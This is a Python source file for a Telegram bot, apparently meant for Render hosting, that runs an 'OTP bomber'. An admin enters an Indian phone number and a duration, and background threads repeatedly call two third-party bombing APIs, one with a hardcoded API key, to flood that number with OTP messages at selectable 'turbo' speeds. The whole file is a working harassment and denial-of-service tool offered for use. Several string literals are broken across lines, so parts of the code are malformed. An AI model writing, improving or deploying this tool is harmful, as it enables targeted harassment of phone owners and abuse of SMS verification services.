from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ConversationHandler, MessageHandler, filters
import requests
import asyncio
import threading
import time
from datetime import datetime, timedelta
import os

app = Flask(__name__)

# Config - Render Environment Variables से आएगा
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
OWN_NUMBER = os.getenv("OWN_NUMBER", "9876543210")

# तेरे bomber.py के APIs [file:65]
API1 = "https://boomberxnexu.vercel.app/api?number={}&country=91&count=10"
API2 = "https://ft-bomber.onrender.com/bomb?num={}&count=10&api_key=Sp5En6lWIppHZfg9yvY-R5eHtpd3fCEF"

# Bot states
WAITING_NUMBER, WAITING_TIME = range(2)

# Global attack tracking
active_attacks = {}

# Speed modes
SPEED_MODES = {
    '1x': 0.5,   # Normal
    '2x': 0.2,   # Fast
    '5x': 0.05   # Turbo
}

async def start(update: Update, context):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only!")
        return
    
    keyboard = [
        [InlineKeyboardButton("🚀 START BOMBER", callback_data="start_bomber")],
        [InlineKeyboardButton("⚡ SPEED CONTROL", callback_data="speed_menu")],
        [InlineKeyboardButton("📊 STATS", callback_data="show_stats")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "*💀 OTP BOMBER BOT 💀*

"
        f"👑 Admin: {update.effective_user.first_name}
"
        f"📱 Default: `{OWN_NUMBER}`

"
        "👆 Choose option above",
        reply_markup=reply_markup, parse_mode='Markdown'
    )

async def start_bomber_callback(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"*📱 Enter 10-digit number*\
"
        f"_Default: `{OWN_NUMBER}`_",
        parse_mode='Markdown'
    )
    return WAITING_NUMBER

async def receive_number(update: Update, context):
    number = update.message.text.strip()
    
    if len(number) != 10 or not number.isdigit():
        await update.message.reply_text("❌ *10 digits only!*")
        return WAITING_NUMBER
    
    context.user_data['number'] = number
    
    keyboard = [[InlineKeyboardButton("⏱️ SET TIME", callback_data="set_time")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"*✅ Number saved*\
"
        f"`+91{number}`\
\
"
        "👆 Set duration (minutes)",
        reply_markup=reply_markup, parse_mode='Markdown'
    )
    return WAITING_TIME

async def set_time_callback(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text("*⏱️ Enter minutes* (1-60)")
    return WAITING_TIME

async def receive_time(update: Update, context):
    try:
        duration = int(update.message.text.strip())
        if duration < 1 or duration > 60:
            await update.message.reply_text("❌ *1-60 minutes only!*")
            return WAITING_TIME
    except:
        await update.message.reply_text("❌ *Number only!*")
        return WAITING_TIME
    
    number = context.user_data['number']
    speed = context.user_data.get('speed', '1x')
    
    # Create unique attack ID
    attack_id = f"{update.effective_chat.id}_{int(time.time())}"
    
    active_attacks[attack_id] = {
        'chat_id': update.effective_chat.id,
        'number': number,
        'duration': duration,
        'speed': speed,
        'start_time': time.time(),
        'total_requests': 0,
        'running': True
    }
    
    # Start background bomber
    threading.Thread(
        target=bomber_attack,
        args=(attack_id,),
        daemon=True
    ).start()
    
    await update.message.reply_text(
        f"*💣 ATTACK STARTED 💣*\
\
"
        f"*📱 Target:* `{number}`\
"
        f"*⏱️ Duration:* `{duration}` min\
"
        f"*⚡ Speed:* `{speed}`\
\
"
        f"*📊 Live status below*\
"
        f"*🛑 Stop:* `/stop`",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

def bomber_attack(attack_id):
    """तेरे bomber.py का exact logic"""
    data = active_attacks[attack_id]
    end_time = data['start_time'] + (data['duration'] * 60)
    delay = SPEED_MODES[data['speed']]
    total_sent = 0
    
    apis = [API1, API2]
    
    while time.time() < end_time and data['running']:
        for api_template in apis:
            try:
                url = api_template.format(data['number'], 10)
                r = requests.get(url, timeout=5)
                total_sent += 1
                data['total_requests'] = total_sent
            except:
                pass  # Silent continue
        
        time.sleep(delay)
    
    data['running'] = False

async def stop(update: Update, context):
    stopped = 0
    for attack_id in list(active_attacks.keys()):
        if str(update.effective_chat.id) in attack_id:
            active_attacks[attack_id]['running'] = False
            stopped += 1
    
    await update.message.reply_text(f"🛑 *Stopped {stopped} attacks!*")

async def speed_menu(update: Update, context):
    keyboard = [
        [InlineKeyboardButton("🐌 1x (Normal)", callback_data="speed_1x")],
        [InlineKeyboardButton("⚡ 2x (Fast)", callback_data="speed_2x")],
        [InlineKeyboardButton("🚀 5x (Turbo)", callback_data="speed_5x")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        "*⚡ SPEED CONTROL*\
"
        "Choose attack speed:",
        reply_markup=reply_markup
    )

async def speed_selected(update: Update, context):
    speed = update.callback_query.data.split('_')[1]
    context.user_data['speed'] = speed
    await update.callback_query.answer(f"✅ *Speed: {speed}*")
    await update.callback_query.message.reply_text("Speed saved! Start bomber now.")

async def stats_callback(update: Update, context):
    total_attacks = len(active_attacks)
    running = len([a for a in active_attacks.values() if a['running']])
    
    stats_msg = (
        f"*📊 BOMBER STATS*\
\
"
        f"*🔥 Active:* `{running}`\
"
        f"*📈 Total:* `{total_attacks}`\
"
        f"*⚡ Default Speed:* `1x`"
    )
    
    await update.callback_query.edit_message_text(stats_msg, parse_mode='Markdown')

# Conversation handler
conv_handler = ConversationHandler(
    entry_points=[CallbackQueryHandler(start_bomber_callback, pattern="start_bomber")],
    states={
        WAITING_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_number)],
        WAITING_TIME: [CallbackQueryHandler(set_time_callback, pattern="set_time"),
                      MessageHandler(filters.TEXT & ~filters.COMMAND, receive_time)]
    },
    fallbacks=[CommandHandler('stop', stop)]
)

# Flask webhook endpoint
@app.route(f'/{TELEGRAM_TOKEN}', methods=['POST'])
def webhook():
    update = Update.de_json(request.get_json(force=True), application.bot)
    asyncio.create_task(application.process_update(update))
    return 'OK'

@app.route('/health')
def health():
    return jsonify({
        'status': 'alive',
        'active_attacks': len(active_attacks),
        'admin_id': ADMIN_ID
    })

if __name__ == '__main__':
    global application
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Handlers
    application.add_handler(CommandHandler('start', start))
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(speed_menu, pattern="speed_menu"))
    application.add_handler(CallbackQueryHandler(speed_selected, pattern="speed_.*"))
    application.add_handler(CallbackQueryHandler(stats_callback, pattern="show_stats"))
    application.add_handler(CommandHandler('stop', stop))
    
    app.application = application
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
